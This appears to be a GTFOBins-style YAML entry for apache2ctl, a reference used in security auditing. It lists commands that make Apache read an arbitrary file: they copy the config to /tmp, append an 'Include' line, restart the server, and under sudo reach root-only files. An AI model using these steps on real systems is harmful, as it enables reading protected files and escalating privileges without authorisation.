---
description: apache2ctl is a front end to the Apache HyperText Transfer Protocol (HTTP) server. It is designed to help the administrator control the functioning of the Apache apache2 daemon.
functions:
    file-read:
        - code: cp -r /etc/apache2/ /tmp/apache2
        - code: |
            LFILE=file_to_read
            echo "Include $LFILE" >> /tmp/apache2/apache2.conf
        - code: apache2ctl -d /tmp/apache2 -k restart
    sudo:
        - code: cp -r /etc/apache2/ /tmp/apache2
        - code: |
            LFILE=file_to_read
            echo "Include $LFILE" >> /tmp/apache2/apache2.conf
        - code: sudo apache2ctl -d /tmp/apache2 -k restart
---
